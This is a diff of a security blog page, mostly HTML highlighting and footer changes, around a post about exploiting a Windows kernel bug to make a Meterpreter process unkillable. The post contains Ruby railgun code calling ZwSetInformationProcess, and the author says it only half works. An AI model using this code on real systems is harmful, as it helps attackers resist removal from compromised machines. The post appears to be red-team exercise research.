@@ -131,30 +131,30 @@ Blog post: <a href="http://waleedassar.blogspot.com/2013/02/kernel-bug-1-process
 <p>Figured I&rsquo;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.</p>
 <p>Started with the C code for the bug: <a href="http://pastebin.com/QejGQXib">http://pastebin.com/QejGQXib</a> along with the only resource I could find about the actual function: <a href="http://processhacker.sourceforge.net/doc/ntfill_8h.html#a6557e0dd024f0e9fa6132eb52d12810a">http://processhacker.sourceforge.net/doc/ntfill_8h.html#a6557e0dd024f0e9fa6132eb52d12810a</a></p>
 <p>I came up with this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>add_function(<span style="color:#e6db74">&#39;ntdll&#39;</span>,<span style="color:#e6db74">&#39;ZwSetInformationProcess&#39;</span>,<span style="color:#e6db74">&#39;DWORD&#39;</span>,<span style="color:#f92672">[</span>
-   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessHandle&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
-   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationClass&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
-   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformation&#34;</span>,<span style="color:#e6db74">&#34;inout&#34;</span><span style="color:#f92672">]</span>,
-   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationLength&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
-<span style="color:#f92672">]</span>)
-processinfo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8000F129</span>
-tproc <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span>open
-tmem <span style="color:#f92672">=</span> tproc<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>allocate(<span style="color:#ae81ff">4</span>)
-tproc<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>write(tmem,processinfo)
-cpidhandle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>GetCurrentProcess()<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
-client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>ntdll<span style="color:#f92672">.</span>ZwSetInformationProcess(cpidhandle,<span style="color:#ae81ff">0x21</span>,tmem,<span style="color:#ae81ff">0x4</span>)
-</code></pre></div><p>ScriptJunkie quickly identified that I was using a DWORD for a Handle and using 4 bits for a 64 bit process (should be 8) as well as the fact that I could use a PDWORD with the ProcessInformation inout parameter instead of writing it to memory myself.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>add_function(<span style="color:#e6db74">&#39;ntdll&#39;</span>,<span style="color:#e6db74">&#39;ZwSetInformationProcess&#39;</span>,<span style="color:#e6db74">&#39;DWORD&#39;</span>,<span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessHandle&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationClass&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformation&#34;</span>,<span style="color:#e6db74">&#34;inout&#34;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationLength&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span><span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>processinfo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8000F129</span>
+</span></span><span style="display:flex;"><span>tproc <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span>open
+</span></span><span style="display:flex;"><span>tmem <span style="color:#f92672">=</span> tproc<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>allocate(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>tproc<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>write(tmem,processinfo)
+</span></span><span style="display:flex;"><span>cpidhandle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>GetCurrentProcess()<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>ntdll<span style="color:#f92672">.</span>ZwSetInformationProcess(cpidhandle,<span style="color:#ae81ff">0x21</span>,tmem,<span style="color:#ae81ff">0x4</span>)
+</span></span></code></pre></div><p>ScriptJunkie quickly identified that I was using a DWORD for a Handle and using 4 bits for a 64 bit process (should be 8) as well as the fact that I could use a PDWORD with the ProcessInformation inout parameter instead of writing it to memory myself.</p>
 <p>The result:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>add_function(<span style="color:#e6db74">&#39;ntdll&#39;</span>,<span style="color:#e6db74">&#39;ZwSetInformationProcess&#39;</span>,<span style="color:#e6db74">&#39;DWORD&#39;</span>,<span style="color:#f92672">[</span>
-     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;HANDLE&#34;</span>,<span style="color:#e6db74">&#34;ProcessHandle&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
-     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationClass&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
-     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;PDWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformation&#34;</span>,<span style="color:#e6db74">&#34;inout&#34;</span><span style="color:#f92672">]</span>,
-     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationLength&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
-<span style="color:#f92672">]</span>)
-processinfo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8000F129</span>
-cpidhandle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>GetCurrentProcess()<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
-client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>ntdll<span style="color:#f92672">.</span>ZwSetInformationProcess(cpidhandle,<span style="color:#ae81ff">0x21</span>,processinfo,<span style="color:#ae81ff">0x4</span>)
-</code></pre></div><p>Which results in a process that you can&rsquo;t kill, but the process is also non-functioning as far as I can tell because the Meterpreter session dies.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>add_function(<span style="color:#e6db74">&#39;ntdll&#39;</span>,<span style="color:#e6db74">&#39;ZwSetInformationProcess&#39;</span>,<span style="color:#e6db74">&#39;DWORD&#39;</span>,<span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;HANDLE&#34;</span>,<span style="color:#e6db74">&#34;ProcessHandle&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationClass&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;PDWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformation&#34;</span>,<span style="color:#e6db74">&#34;inout&#34;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationLength&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span><span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>processinfo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8000F129</span>
+</span></span><span style="display:flex;"><span>cpidhandle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>GetCurrentProcess()<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>ntdll<span style="color:#f92672">.</span>ZwSetInformationProcess(cpidhandle,<span style="color:#ae81ff">0x21</span>,processinfo,<span style="color:#ae81ff">0x4</span>)
+</span></span></code></pre></div><p>Which results in a process that you can&rsquo;t kill, but the process is also non-functioning as far as I can tell because the Meterpreter session dies.</p>
 <p>I&rsquo;m curious if with some tweaking I can get it to act much like the KillMe.exe
 <a href="https://code.google.com/p/ollytlscatch/downloads/detail?name=KillMe.exe">https://code.google.com/p/ollytlscatch/downloads/detail?name=KillMe.exe</a></p>
 <p>Which continues to operate just fine after the modification happens.</p>
@@ -186,7 +186,7 @@ client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2023</span>
             
             <span><a href="https://malicious.link/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
         </div>
@@ -194,7 +194,7 @@ client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</
     <div class="footer__inner">
         <div class="footer__content">
             <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/mubix">mubix</a> - Theme by <a href="https://github.com/rhazdon/">Djordje Atlialp</a></span>
           </div>
     </div>
 </footer>
@@ -207,7 +207,7 @@ client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</
 
 
 
-<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="/bundle.min.8cc3758efe48ef82e2eb9a5f317b44c0805353a43762207be6fe8ffb05815cce7a19d37f6bf387c378a3bdfc3029981668d645374a33db4ee3480e15a4bfdc7c.js" integrity="sha512-jMN1jv5I74Li65pfMXtEwIBTU6Q3YiB75v6P&#43;wWBXM56GdN/a/OHw3ijvfwwKZgWaNZFN0oz207jSA4VpL/cfA=="></script>
 
 
 
